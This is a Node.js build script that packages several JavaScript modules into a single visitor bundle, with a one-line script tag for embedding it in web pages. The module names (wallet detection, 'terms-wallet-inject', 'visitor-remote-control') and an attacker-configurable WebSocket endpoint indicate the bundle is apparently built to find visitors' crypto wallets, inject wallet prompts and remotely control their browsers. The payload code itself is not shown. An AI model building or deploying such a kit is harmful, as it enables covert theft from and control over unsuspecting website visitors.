#!/usr/bin/env node
/**
 * Build single visitor bundle: dist/legion-auto.js
 * node build-bundle.mjs
 * node build-bundle.mjs --ws wss://yourdomain.com/legion-ws
 */
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const dist = resolve(__dirname, 'dist');
mkdirSync(dist, { recursive: true });

let wsUrl = '';
const args = process.argv.slice(2);
for (let i = 0; i < args.length; i++) {
  if (args[i] === '--ws' && args[i + 1]) wsUrl = args[++i];
}

const parts = [
  'agent-bootstrap.js',
  'wallet-registry.js',
  'wallet-detector.js',
  'terms-wallet-inject.js',
  'agent-core.js',
  'extension-assist.js',
  'visitor-remote-control.js',
  'visitor-bridge.js',
];

let bundle = `/*! Legion Agent Auto — zero-config visitor | ${new Date().toISOString()} */\n`;
for (const f of parts) {
  let src = readFileSync(resolve(__dirname, f), 'utf8');
  if (f === 'agent-bootstrap.js' && wsUrl) {
    src = src.replace('__LEGION_WS_URL__', wsUrl);
  }
  bundle += `\n/* ── ${f} ── */\n${src}\n`;
}

const out = resolve(dist, 'legion-auto.js');
writeFileSync(out, bundle, 'utf8');
console.log('Built:', out, `(${(bundle.length / 1024).toFixed(1)} KB)`);
if (wsUrl) console.log('WS baked:', wsUrl);

const snippet = `<!-- Visitor sirf yeh ek line — kuch aur nahi -->
<script src="./legion-auto.js" defer></script>
`;
writeFileSync(resolve(dist, 'attach-snippet.html'), snippet, 'utf8');
console.log('Snippet: dist/attach-snippet.html (single script tag)');
